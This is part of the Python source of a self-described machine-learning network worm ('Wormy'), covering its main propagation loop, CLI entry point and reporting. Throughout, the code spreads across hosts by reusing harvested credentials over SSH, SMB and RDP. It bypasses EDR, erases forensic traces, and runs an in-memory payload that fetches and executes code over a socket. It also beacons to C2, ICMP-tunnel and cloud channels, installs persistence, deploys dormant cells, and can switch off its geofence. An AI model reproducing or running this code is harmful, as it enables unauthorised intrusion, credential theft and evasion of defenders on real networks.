        if len(memory) < 16:
            return

        # Progressive batch size based on memory size
        batch_size = min(64, max(16, len(memory) // 4))

        # Multiple replay passes for faster convergence
        n_passes = min(3, max(1, len(memory) // 64))

        logger.info(
            f"Online learning: {len(memory)} experiences, batch={batch_size}, passes={n_passes}"
        )

        for _ in range(n_passes):
            self.rl_agent.replay(batch_size=batch_size)

        # Thompson Sampling ensemble replay
        if self.use_thompson_sampling and hasattr(self.rl_agent, 'replay_ensemble'):
            try:
                self.rl_agent.replay_ensemble(batch_size=max(16, batch_size // 2))
            except Exception as e:
                logger.debug(f"Thompson ensemble replay failed: {e}")

        # Soft target update every online learning step
        self.rl_agent.update_target_model(tau=0.01)

        # Decay exploration faster during operation
        if self.rl_agent.epsilon > 0.05:
            self.rl_agent.epsilon = max(0.05, self.rl_agent.epsilon * 0.99)

        # Save checkpoint periodically
        try:
            checkpoint_path = self.config.ml.rl_agent_path.replace(".h5", "_online.h5")
            self.rl_agent.save(checkpoint_path)
        except Exception as e:
            logger.debug(f"Failed to save online checkpoint: {e}")

    def _credential_pivot_cycle(self):
        """Try discovered credentials against all uninfected hosts"""
        if not self.cred_manager or not self.scan_results:
            return

        discovered = self.cred_manager.get_discovered_credentials()
        if not discovered:
            return

        uninfected = [
            h
            for h in self.scan_results
            if h["ip"] not in self.infected_hosts and h["ip"] not in self.failed_targets
        ]

        if not uninfected:
            return

        logger.info(
            f"Credential pivot: trying {len(discovered)} creds on {len(uninfected)} hosts"
        )

        # Use contextual bandit to prioritize credentials
        if self.contextual_bandit:
            try:
                host = uninfected[0]
                ctx = {
                    "service": "ssh" if 22 in host.get("open_ports", []) else "smb" if 445 in host.get("open_ports", []) else "unknown",
                    "os": host.get("os_guess", "Unknown"),
                    "ports": host.get("open_ports", []),
                    "is_high_value": host.get("vulnerability_score", 0) > 70,
                    "is_domain_controller": host.get("host_type") == "domain_controller",
                    "is_database": host.get("host_type") == "database",
                    "target_count": len(self.infected_hosts),
                }
                bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
                if bandit_cred:
                    username, password, ucb = bandit_cred
                    discovered = [(username, password)] + [c for c in discovered if c != (username, password)]
            except Exception:
                pass
            except Exception:
                pass

        for username, password in discovered[:5]:
            for host in uninfected:
                ip = host["ip"]
                ports = host.get("open_ports", [])

                service = None
                if 22 in ports:
                    service = "ssh"
                elif 445 in ports:
                    service = "smb"
                elif 3389 in ports:
                    service = "rdp"
                elif 80 in ports or 8080 in ports:
                    service = "http"

                if not service:
                    continue

                logger.debug(f"Pivot: {username} -> {ip} ({service})")

                if self.dry_run:
                    continue

                # Try actual login
                success = self._try_service_login(
                    ip, ports[0] if ports else 22, service, username, password
                )
                if success:
                    logger.success(f"Pivot success: {username} -> {ip} ({service})")
                    if ip not in self.infected_hosts:
                        self.infected_hosts.add(ip)
                        self.stats["infections"] += 1
                        if self.knowledge_graph:
                            self.knowledge_graph.mark_infected(ip, f"pivot_{service}")
                        if self.mitre_mapper:
                            try:
                                self.mitre_mapper.record(
                                    wormy_technique="credential_pivot",
                                    target=ip,
                                    success=True,
                                    details={"service": service, "username": username},
                                )
                            except Exception:
                                pass
                    self.cred_manager.record_attempt(ip, username, True)
                else:
                    self.cred_manager.record_attempt(ip, username, False)

    def _run_adaptive_cycle(self, iteration: int):
        """Run the full Adaptive Cycle (APT-level autonomous propagation)"""
        if not self.adaptive_cycle:
            return

        logger.info(f"\n{'=' * 60}")
        logger.info(f"ADAPTIVE CYCLE #{self.adaptive_cycle.cycle_count + 1}")
        logger.info(f"{'=' * 60}")

        # Gather data for the cycle
        scan_results = self.scan_results or []
        exploit_results = {}
        available_exploits = []

        if self.exploit_manager:
            available_exploits = [e.name for e in self.exploit_manager.exploits[:10]]

        # Run the adaptive cycle
        cycle_result = self.adaptive_cycle.run_cycle(
            scan_results=scan_results,
            exploit_results=exploit_results,
            available_exploits=available_exploits,
        )

        # Log recommendations
        for rec in cycle_result.get("recommendations", []):
            logger.info(f"  → {rec}")

        # Deploy dormant cells on newly infected hosts
        if self.dormant_cells and self.infected_hosts:
            for ip in list(self.infected_hosts)[-3:]:  # Deploy on last 3 infected
                if ip not in [c["host_ip"] for c in self.dormant_cells.cells.values()]:
                    cell_id = self.dormant_cells.deploy_cell(ip, max_dormant_days=7)
                    logger.info(f"  Dormant cell deployed: {cell_id} on {ip}")

    def _check_distributed_redundancy(self):
        """Check peer health and repair dead peers"""
        if not self.distributed_redundancy:
            return

        # Add infected hosts as peers
        for ip in self.infected_hosts:
            if ip != get_local_ip():
                self.distributed_redundancy.add_peer(ip)

        # Check and repair
        repairs = self.distributed_redundancy.check_and_repair()
        if repairs:
            for repair in repairs:
                logger.info(
                    f"  Distributed repair: {repair['action']} on {repair.get('peer_ip', '?')}"
                )

    def _post_exploitation_cleanup(self, ip: str, target: Dict):
        """
        Post-exploitation cleanup: anti-forensics, EDR bypass, memory execution
        Called after each successful exploitation
        """
        os_guess = target.get("os_guess", "Unknown").lower()

        # 1. EDR detection and bypass (Windows)
        if "windows" in os_guess:
            try:
                edr_detected = self.edr_bypass.detect_edr()
                if edr_detected:
                    logger.warning(f"EDR detected on {ip}: {edr_detected}")
                    # Attempt bypass
                    bypass_results = self.edr_bypass.apply_all_bypasses()
                    successful_bypasses = [k for k, v in bypass_results.items() if v]
                    if successful_bypasses:
                        logger.success(
                            f"EDR bypass successful on {ip}: {successful_bypasses}"
                        )
                        self._detection_events.append(
                            {
                                "type": "edr_bypass",
                                "ip": ip,
                                "techniques": successful_bypasses,
                                "timestamp": datetime.now().isoformat(),
                            }
                        )
            except Exception as e:
                logger.debug(f"EDR bypass failed on {ip}: {e}")

        # 2. Anti-forensics cleanup
        try:
            cleanup_results = self.anti_forensics.clean_all_tracks()
            successful_cleanups = [k for k, v in cleanup_results.items() if v]
            if successful_cleanups:
                logger.debug(f"Anti-forensics cleanup on {ip}: {successful_cleanups}")
        except Exception as e:
            logger.debug(f"Anti-forensics failed on {ip}: {e}")

        # 3. Memory execution for next payload (if available)
        if self.memory_execution:
            try:
                # Generate payload for in-memory execution
                payload = f"import socket; s=socket.socket(); s.connect(('{ip}', 4444)); exec(s.recv(4096))"
                success = self.memory_execution.execute_in_memory(payload.encode())
                if success:
                    logger.debug(f"In-memory payload executed on {ip}")
            except Exception as e:
                logger.debug(f"Memory execution failed on {ip}: {e}")

        # 4. Direct NT Syscalls (Windows — inject shellcode via syscall)
        if self.direct_syscalls:
            try:
                if self.direct_syscalls.available():
                    logger.debug(f"Direct syscalls available on {ip}")
                    # Syscall injection would happen here with actual shellcode
                    syscalls = self.direct_syscalls.get_resolved_syscalls()
                    if syscalls:
                        logger.debug(f"Resolved {len(syscalls)} syscalls for {ip}")
            except Exception as e:
                logger.debug(f"Direct syscalls check failed on {ip}: {e}")

        # 5. Sleep Obfuscation — mask sleep intervals on this host
        if self.sleep_obfuscator:
            try:
                self.sleep_obfuscator.obfuscated_sleep(0.1)
                logger.debug(f"Sleep obfuscation verified on {ip}")
            except Exception as e:
                logger.debug(f"Sleep obfuscation failed on {ip}: {e}")

        # MITRE ATT&CK: record defense evasion
        if self.mitre_mapper:
            try:
                self.mitre_mapper.record(
                    wormy_technique="defense_evasion",
                    target=ip,
                    success=True,
                    details={"phase": "post_exploitation_cleanup"},
                )
            except Exception:
                pass

    def propagate(self):
        """Main propagation loop"""
        logger.info("Starting propagation")
        self.running = True
        self.start_time = datetime.now()
        self.stats["start_time"] = self.start_time

        local_ip = get_local_ip()
        self.infected_hosts.add(local_ip)

        if self.knowledge_graph:
            self.knowledge_graph.add_host(local_ip, is_infected=True)
            self.knowledge_graph.mark_infected(local_ip, "origin")

        # Register origin host with Host Monitor
        if self.host_monitor:
            self.host_monitor.register_host(
                local_ip, os_guess="Local", ports=[], exploit_method="origin"
            )
            # Start continuous monitoring
            self.host_monitor.start_monitoring(interval=30)
            logger.info("Host Monitor started (continuous monitoring + self-healing)")

        # Start C2 server in background
        if self.c2_server:
            try:
                self.c2_server.run_background()
                logger.info(
                    f"C2 Server started on {self.config.c2.c2_server}:{self.config.c2.c2_port}"
                )
            except Exception as e:
                logger.warning(f"Failed to start C2 Server: {e}")

        # Start Web Dashboard in background
        if self.web_dashboard:
            try:
                self.web_dashboard.run_background()
                logger.info("Web Dashboard started at http://0.0.0.0:5000")
                time.sleep(1)
                try:
                    import webbrowser

                    webbrowser.open("http://localhost:5000", new=2)
                except Exception:
                    pass
            except Exception as e:
                logger.warning(f"Failed to start Web Dashboard: {e}")

        # Start Armitage Dashboard in background
        if self.armitage_dashboard:
            try:
                self.armitage_dashboard.run_background()
                logger.info("Armitage Dashboard started at http://0.0.0.0:5001")
                time.sleep(1)
                try:
                    import webbrowser

                    webbrowser.open("http://localhost:5001", new=2)
                except Exception:
                    pass
            except Exception as e:
                logger.warning(f"Failed to start Armitage Dashboard: {e}")

        # Start Multi-Operator Server in background
        if self.multi_operator:
            try:
                self.multi_operator.start(background=True)
                logger.info("Multi-Operator Server started on port 8444")
            except Exception as e:
                logger.warning(f"Multi-Operator Server failed to start: {e}")

        # ICMP tunnel listener (covert C2)
        if self.icmp_tunnel:
            try:
                self.icmp_tunnel.start_listener(callback=lambda msg: logger.debug(f"ICMP msg: {msg}"))
                logger.info("ICMP Tunnel listener started")
            except Exception as e:
                logger.warning(f"ICMP Tunnel listener failed: {e}")

        # Establish local persistence on origin host
        if self.local_persistence:
            try:
                payload_path = os.path.abspath(__file__)
                result, details = self.local_persistence.establish_persistence(payload_path)
                if result:
                    logger.info("Local persistence established on origin host")
            except Exception as e:
                logger.debug(f"Local persistence failed: {e}")

        # Advanced persistence (all techniques)
        if self.advanced_persistence:
            try:
                payload_path = os.path.abspath(__file__)
                results = self.advanced_persistence.install_all(payload_path)
                success_count = sum(1 for v in results.values() if v)
                if success_count:
                    logger.info(f"Advanced persistence: {success_count}/{len(results)} techniques active")
            except Exception as e:
                logger.debug(f"Advanced persistence failed: {e}")

        # MITRE ATT&CK: record persistence
        if self.mitre_mapper:
            try:
                self.mitre_mapper.record(
                    wormy_technique="persistence",
                    target=local_ip,
                    success=True,
                    details={"phase": "initial_persistence"},
                )
            except Exception:
                pass

        iteration = 0
        online_learning_interval = 10
        adaptive_cycle_interval = 5  # Run adaptive cycle every N iterations

        while self.running and self.check_safety_constraints():
            iteration += 1
            logger.info(f"\n{'=' * 60}")
            logger.info(f"PROPAGATION ITERATION {iteration}")
            logger.info(f"{'=' * 60}")

            # Rescan periodically
            if iteration == 1 or iteration % 5 == 0:
                self.scan_network()

            # ===== ADAPTIVE CYCLE =====
            if self.adaptive_cycle and iteration % adaptive_cycle_interval == 0:
                self._run_adaptive_cycle(iteration)

            # Credential pivoting
            if self.cred_manager and iteration % 3 == 0:
                self._credential_pivot_cycle()

            # Online learning
            if (
                self.config.ml.online_learning
                and iteration % online_learning_interval == 0
            ):
                self._online_learning_step()
                
            # OTA Brain Updates
            if self.c2_server and getattr(self.c2_server, 'pending_brain_update', None):
                update_path = self.c2_server.pending_brain_update
                if os.path.exists(update_path):
                    logger.success("Applying Over-The-Air Brain Update...")
                    try:
                        self.rl_agent.load(update_path)
                        logger.success("OTA Brain Update applied successfully. Worm is now using new ML weights.")
                        self.c2_server.pending_brain_update = None
                        os.remove(update_path)
                    except Exception as e:
                        logger.error(f"Failed to apply OTA Brain Update: {e}")

            # Distributed redundancy check
            if self.distributed_redundancy and iteration % 10 == 0:
                self._check_distributed_redundancy()

            # Select and exploit target
            target = self.select_next_target()
            if not target:
                logger.warning("No more targets available")
                break

            self.exploit_target(target)

            # Post-exploitation: anti-forensics + EDR bypass on infected hosts
            if self.config.evasion.stealth_mode:
                self._post_exploitation_cleanup(target["ip"], target)

            # Send C2 beacon for each infected host
            if self.c2_server and target["ip"] in self.infected_hosts:
                try:
                    self.c2_server.process_beacon(
                        {
                            "host_id": target["ip"],
                            "ip": target["ip"],
                            "hostname": target.get("hostname", "unknown"),
                            "os": target.get("os_guess", "Unknown"),
                            "ports": target.get("open_ports", []),
                            "beacon_type": "infection",
                        }
                    )
                    self.stats["c2_beacons"] += 1
                except Exception as e:
                    logger.debug(f"C2 beacon failed: {e}")

            # Cloud C2 beacon
            if self.cloud_c2 and target["ip"] in self.infected_hosts:
                try:
                    self.cloud_c2.beacon({
                        "event": "beacon",
                        "ip": target["ip"],
                        "os": target.get("os_guess", "Unknown"),
                        "iteration": iteration,
                    })
                except Exception:
                    pass

            # ICMP tunnel beacon (covert channel)
            if self.icmp_tunnel and target["ip"] in self.infected_hosts:
                try:
                    self.icmp_tunnel.beacon({
                        "ip": target["ip"],
                        "os": target.get("os_guess", "Unknown"),
                        "iteration": iteration,
                    })
                except Exception:
                    pass

            # PFS Crypto: track beacon for PFS-secured channels
            if self.pfs_crypto and target["ip"] in self.infected_hosts:
                self.stats["pfs_beacons"] = self.stats.get("pfs_beacons", 0) + 1

            # MITRE ATT&CK: record execution
            if self.mitre_mapper:
                try:
                    self.mitre_mapper.record(
                        wormy_technique="execution",
                        target=target["ip"],
                        success=target["ip"] in self.infected_hosts,
                        details={"iteration": iteration, "method": "propagate"},
                    )
                except Exception:
                    pass

            # Plugin system: run enabled plugins every 5 iterations
            if self.plugin_manager and iteration % 5 == 0:
                try:
                    for plugin in self.plugin_manager.get_enabled_plugins():
                        plugin_instance = self.plugin_manager.load_plugin(plugin.name)
                        if plugin_instance and hasattr(plugin_instance, 'execute'):
                            try:
                                plugin_instance.execute(worm_core=self)
                            except Exception:
                                pass
                except Exception:
                    pass

            # Wave propagation (pivot from newly infected hosts)
            if self.wave_propagation and iteration % 3 == 0 and len(self.infected_hosts) > 1:
                try:
                    targets = [
                        h for h in self.scan_results
                        if h["ip"] not in self.infected_hosts
                        and h["ip"] not in self.failed_targets
                    ]
                    if targets and self.cred_manager:
                        creds = self.cred_manager.get_discovered_credentials()
                        if creds:
                            self.wave_propagation.propagate_wave(
                                targets=targets,
                                credentials=creds,
                                exploit_fn=self.exploit_target,
                                wave=iteration // 3,
                                c2_server=f"{self.config.c2.c2_server}:{self.config.c2.c2_port}",
                            )
                except Exception as e:
                    logger.debug(f"Wave propagation failed: {e}")

            # Swarm Coordinator: share knowledge and assign targets
            if self.swarm_coordinator and self.swarm_agent and iteration % 3 == 0:
                try:
                    knowledge = {h["ip"]: h for h in getattr(self, 'scan_results', [])}
                    self.swarm_coordinator.share_knowledge(self.swarm_agent.agent_id, knowledge)
                    for h_ip in self.infected_hosts:
                        self.swarm_agent.report_infection(h_ip)
                    stats = self.swarm_coordinator.get_swarm_statistics()
                    logger.debug(f"Swarm: {stats['total_agents']} agents, {stats['total_infected']} infected")
                except Exception as e:
                    logger.debug(f"Swarm knowledge sharing failed: {e}")

            # Agent controller: heartbeat + task dispatch
            if self.agent_controller and iteration % 2 == 0:
                try:
                    self.agent_controller.heartbeat_check()
                except Exception as e:
                    logger.debug(f"Agent controller tick failed: {e}")

            # Self-healing status check
            if self.advanced_self_healing and iteration % 10 == 0:
                try:
                    health = self.advanced_self_healing.perform_health_check()
                    if health.get("integrity", 1.0) < 0.5:
                        logger.warning(f"Integrity low ({health['integrity']:.2f}) – file may be tampered")
                except Exception as e:
                    logger.debug(f"Self-healing check failed: {e}")

            # Propagation delay
            if self.config.propagation.propagation_delay > 0:
                time.sleep(self.config.propagation.propagation_delay)

            if len(self.infected_hosts) >= self.config.propagation.max_infections:
                logger.success(f"Max infections: {len(self.infected_hosts)}")
                break

            self.print_status()

        self.stats["end_time"] = datetime.now()
        self.running = False
        logger.success("Propagation complete")
        self.print_final_report()

    def stop(self):
        """Stop propagation"""
        self.running = False
        logger.info("Stopping propagation...")

    def print_status(self):
        """Print current status"""
        print(f"\n{'-' * 60}")
        print(f"Status Update:")
        print(f"  Infected: {len(self.infected_hosts)}")
        print(f"  Failed: {len(self.failed_targets)}")
        print(f"  Discovered: {self.stats['total_hosts_discovered']}")
        print(f"  Vulnerabilities: {self.stats['vulnerabilities_found']}")
        print(f"  Exploit Chains: {self.stats['exploit_chains_built']}")
        print(
            f"  Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}"
        )
        print(
            f"  Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}"
        )
        print(f"  Credentials Discovered: {self.stats['credentials_discovered']}")
        print(f"  C2 Beacons: {self.stats['c2_beacons']}")
        print(f"  Polymorphic Mutations: {self.stats['polymorphic_mutations']}")

        total_attempts = self.stats["infections"] + self.stats["failed_exploits"]
        success_rate = (
            self.stats["infections"] / total_attempts * 100 if total_attempts > 0 else 0
        )
        print(
            f"  Success Rate: {self.stats['infections']}/{total_attempts} ({success_rate:.1f}%)"
        )

        if self.start_time:
            elapsed = datetime.now() - self.start_time
            print(f"  Runtime: {elapsed}")

        if self.knowledge_graph:
            kg_stats = self.knowledge_graph.get_statistics()
            print(
                f"  Knowledge Graph: {kg_stats['hosts']} hosts, {kg_stats['edges']} edges"
            )

        # Host Monitor dashboard
        if self.host_monitor:
            overview = self.host_monitor.get_network_overview()
            print(
                f"  Host Monitor: {overview['total_hosts']} hosts, "
                f"avg health {overview['avg_health']:.0f}%, "
                f"{overview['unique_payloads']} unique payloads, "
                f"{overview['total_repairs']} repairs"
            )

        # APT-Level Adaptive Cycle status
        if self.adaptive_cycle:
            apt_status = self.adaptive_cycle.get_full_status()
            print(f"\n  {'=' * 56}")
            print(f"  APT-LEVEL ADAPTIVE CYCLE STATUS")
            print(f"  {'=' * 56}")
            print(f"  Cycle Count: {apt_status['cycle_count']}")
            recon = apt_status["predictive_recon"]
            print(
                f"  Predictive Recon: {recon['hosts_analyzed']} hosts analyzed, "
                f"{recon['predictions_made']} predictions made"
            )
            selector = apt_status["exploit_selector"]
            print(
                f"  Adaptive Exploit: {selector['total_attempts']} attempts, "
                f"{selector['q_table_entries']} Q-table entries"
            )
            redundancy = apt_status["distributed_redundancy"]
            print(
                f"  Distributed Mesh: {redundancy['heartbeat']['active_peers']} active, "
                f"{redundancy['heartbeat']['dead_peers']} dead"
            )
            mimicry = apt_status["traffic_mimicry"]
            print(f"  Traffic Mimicry: {mimicry['active_protocol']} protocol")
            poly = apt_status["semantic_polymorphism"]
            print(f"  Semantic Polymorphism: {poly['unique_variants']} variants")
            cells = apt_status["dormant_cells"]
            print(
                f"  Dormant Cells: {cells['dormant']} dormant, "
                f"{cells['active']} active, {cells['total_cells']} total"
            )

        # New modules status
        print(f"\n  {'=' * 56}")
        print(f"  EXTRA MODULES STATUS")
        print(f"  {'=' * 56}")
        if self.cloud_c2:
            try:
                c2_status = self.cloud_c2.get_status()
                print(f"  Cloud C2: {c2_status.get('enabled', [])}")
            except Exception:
                print(f"  Cloud C2: enabled")
        if self.multi_operator:
            try:
                op_status = self.multi_operator.get_status()
                print(f"  Multi-Operator: {op_status.get('operators', 0)} operators")
            except Exception:
                print(f"  Multi-Operator: running")
        if self.mitre_mapper:
            try:
                mitre_status = self.mitre_mapper.get_status()
                print(f"  MITRE ATT&CK: {mitre_status.get('total_techniques', 0)} techniques mapped")
            except Exception:
                print(f"  MITRE ATT&CK: enabled")
        if self.plugin_manager:
            try:
                plugin_stats = self.plugin_manager.get_plugin_stats()
                print(f"  Plugins: {plugin_stats.get('enabled', 0)} enabled / {plugin_stats.get('total', 0)} total")
            except Exception:
                enabled = len(self.plugin_manager.get_enabled_plugins())
                print(f"  Plugins: {enabled} enabled")
        print(f"  ICMP Tunnel: {'enabled' if self.icmp_tunnel else 'disabled'}")
        print(f"  JA3 Spoofing: {'enabled' if self.ja3_spoofer else 'disabled'}")
        print(f"  DCOM Lateral: {'enabled' if self.dcom_lateral else 'disabled'}")
        print(f"  Direct Syscalls: {'enabled' if self.direct_syscalls else 'disabled'}")
        print(f"  Sleep Obfuscation: {'enabled' if self.sleep_obfuscator else 'disabled'}")
        print(f"  Local Persistence: {'enabled' if self.local_persistence else 'disabled'}")
        print(f"  VSS NTDS: {'enabled' if self.vss_ntds else 'disabled'}")
        print(f"  Swarm Coordinator: {'enabled' if self.swarm_coordinator else 'disabled'}")
        print(f"  Payload Manager: {'enabled' if self.payload_manager else 'disabled'}")
        print(f"  Fuzzing Engine: {'enabled' if self.fuzzing_engine else 'disabled'}")
        pfs_count = self.stats.get("pfs_beacons", 0)
        print(f"  PFS Crypto: {'enabled' if self.pfs_crypto else 'disabled'}{f' ({pfs_count} beacons)' if pfs_count else ''}")

        print(f"{'-' * 60}\n")

    def print_final_report(self):
        """Print final statistics and generate audit report"""
        self.stats["end_time"] = self.stats.get("end_time") or datetime.now()
        start_time = self.stats.get("start_time") or datetime.now()
        
        print(f"\n{'=' * 60}")
        print("FINAL REPORT")
        print(f"{'=' * 60}")
        print(f"Start: {start_time}")
        print(f"End: {self.stats['end_time']}")

        duration = self.stats["end_time"] - start_time
        print(f"Duration: {duration}")

        print(f"\nInfections: {self.stats['infections']}")
        print(f"Failed: {self.stats['failed_exploits']}")
        print(f"Scans: {self.stats['scans']}")
        print(f"Hosts Discovered: {self.stats['total_hosts_discovered']}")
        print(f"Vulnerabilities Found: {self.stats['vulnerabilities_found']}")
        print(f"Exploit Chains Built: {self.stats['exploit_chains_built']}")
        print(
            f"Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}"
        )
        print(
            f"Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}"
        )
        print(f"Credentials Discovered: {self.stats['credentials_discovered']}")
        print(f"C2 Beacons: {self.stats['c2_beacons']}")
        print(f"Polymorphic Mutations: {self.stats['polymorphic_mutations']}")

        total = self.stats["infections"] + self.stats["failed_exploits"]
        if total > 0:
            print(f"Success Rate: {self.stats['infections'] / total * 100:.1f}%")

        print(f"\nInfected Hosts:")
        for ip in sorted(self.infected_hosts):
            print(f"  [INFECTED] {ip}")

        print(f"\nFailed Targets:")
        for ip in sorted(self.failed_targets):
            print(f"  [FAILED] {ip}")

        if self.cred_manager:
            self.cred_manager.print_statistics()

        if self.lateral_movement:
            lm_stats = self.lateral_movement.get_statistics()
            print(f"\nLateral Movement:")
            print(f"  Attempts: {lm_stats['attempts']}")
            print(f"  Successes: {lm_stats['successes']}")
            print(f"  Rate: {lm_stats['success_rate']:.1f}%")
            print(f"  By technique: {lm_stats['by_technique']}")

        if self.knowledge_graph:
            kg_summary = self.knowledge_graph.get_network_summary()
            print(f"\nKnowledge Graph Summary:")
            for k, v in kg_summary.items():
                print(f"  {k}: {v}")

        if self.polymorphic_engine:
            poly_stats = self.polymorphic_engine.get_statistics()
            print(f"\nPolymorphic Engine:")
            print(f"  Mutations: {poly_stats['mutations_generated']}")
            print(f"  Unique signatures: {poly_stats['unique_signatures']}")

        print(f"{'=' * 60}\n")

        # Generate audit report
        if self.audit_generator:
            try:
                exploit_stats = (
                    self.exploit_manager.get_statistics()
                    if hasattr(self.exploit_manager, "get_statistics")
                    else {}
                )
                cred_stats = (
                    self.cred_manager.get_statistics() if self.cred_manager else {}
                )
                lm_stats = (
                    self.lateral_movement.get_statistics()
                    if self.lateral_movement
                    else {}
                )

                report_files = self.audit_generator.generate(
                    worm_stats=self.stats,
                    scan_results=self.scan_results,
                    infected_hosts=self.infected_hosts,
                    failed_targets=self.failed_targets,
                    exploit_stats=exploit_stats,
                    credential_stats=cred_stats,
                    lateral_movement_stats=lm_stats,
                    output_dir="reports",
                )
                logger.info(f"Audit reports: {report_files}")
            except Exception as e:
                logger.warning(f"Failed to generate audit report: {e}")

        # Export knowledge graph
        if self.knowledge_graph:
            try:
                os.makedirs("reports", exist_ok=True)
                self.knowledge_graph.export_graph("reports/knowledge_graph.json")
            except Exception as e:
                logger.warning(f"Failed to export knowledge graph: {e}")

        # Export logs
        try:
            logger.export_logs("reports/final_report.json")
        except Exception:
            pass

    def self_destruct(self):
        """Self-destruct"""
        logger.critical("SELF-DESTRUCT ACTIVATED")
        logger.info("Cleaning up...")
        self.shutdown()

    def shutdown(self):
        """Graceful shutdown"""
        logger.info("Shutting down")
        self.running = False
        self.print_final_report()

        if self.config.ml.online_learning:
            try:
                save_path = self.config.ml.rl_agent_path
                if os.path.isdir(save_path):
                    save_path = os.path.join(save_path, "rl_agent.h5")
                self.rl_agent.save(save_path)
                logger.info("RL agent saved")
            except Exception as e:
                logger.warning(f"Failed to save RL agent: {e}")

        # Stop C2
        if self.c2_server:
            try:
                self.c2_server.stop()
            except Exception as e:
                logger.warning(f"C2 server stop error: {e}")

        # Stop Multi-Operator Server
        if self.multi_operator:
            try:
                self.multi_operator.stop()
            except Exception as e:
                logger.warning(f"Multi-Operator stop error: {e}")

        # Stop ICMP Tunnel
        if self.icmp_tunnel:
            try:
                self.icmp_tunnel.stop()
            except Exception as e:
                logger.warning(f"ICMP tunnel stop error: {e}")

        # Save MITRE ATT&CK report
        if self.mitre_mapper:
            try:
                mitre_path = self.mitre_mapper.save_report(path="reports/mitre_attack.json")
                logger.info(f"MITRE ATT&CK report saved: {mitre_path}")
            except Exception as e:
                logger.warning(f"MITRE report save error: {e}")

        logger.info("Shutdown complete")
        sys.exit(0)


def get_local_ip():
    """Get local IP address"""
    import socket

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(description="Wormy ML Network Worm v3.0")
    parser.add_argument("--config", type=str, help="Configuration file")
    parser.add_argument("--scan-only", action="store_true", help="Scan only")
    parser.add_argument("--kill-switch", type=str, help="Kill switch code")
    parser.add_argument(
        "--profile",
        type=str,
        choices=["stealth", "aggressive", "audit"],
        help="Configuration profile",
    )
    parser.add_argument(
        "--dry-run", action="store_true", help="Simulate without real exploits"
    )
    parser.add_argument("--no-monitor", action="store_true", help="Disable CLI monitor")
    parser.add_argument(
        "--interactive", "-i", action="store_true", help="Interactive CLI mode"
    )
    parser.add_argument(
        "--no-geofence", action="store_true", help="Disable geofence check"
    )

    args = parser.parse_args()

    worm = WormCore(
        config_file=args.config,
        use_cli_monitor=not args.no_monitor and not args.interactive,
        profile=args.profile,
        dry_run=args.dry_run,
        interactive=args.interactive,
    )

    if args.no_geofence:
        worm.config.safety.geofence_enabled = False
        logger.info("Geofence disabled via --no-geofence flag")

    if args.kill_switch:
        worm.activate_kill_switch(args.kill_switch)
        return

    if args.scan_only:
        logger.info("SCAN-ONLY MODE")
        results = worm.scan_network()
        worm.scanner.print_summary()
        return

    if args.interactive:
        from cli import InteractiveCLI
        cli = InteractiveCLI(worm)
        try:
            cli.cmdloop()
        except KeyboardInterrupt:
            worm.shutdown()
        return

    try:
        worm.propagate()
    except KeyboardInterrupt:
        logger.warning("\nInterrupted by user")
        worm.shutdown()
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        worm.shutdown()


if __name__ == "__main__":
    main()
